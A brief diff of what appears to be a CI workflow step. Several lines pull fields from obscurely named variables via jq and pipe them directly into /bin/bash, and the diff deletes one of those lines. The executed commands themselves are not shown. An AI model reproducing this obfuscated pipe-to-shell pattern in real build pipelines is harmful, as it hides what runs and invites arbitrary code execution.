@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$hun2" | jq -r .yehyc5790 | /bin/bash
           printf '%s' "$hi8" | jq -r .fgsem810 | /bin/bash
           printf '%s' "$hvr992" | jq -r .l7469 | /bin/bash
-          echo $nolib325 | jq -r .a02802 | /bin/bash
           echo $b6138 | jq -r .z3474 | /bin/bash
 
       - name: Upload results
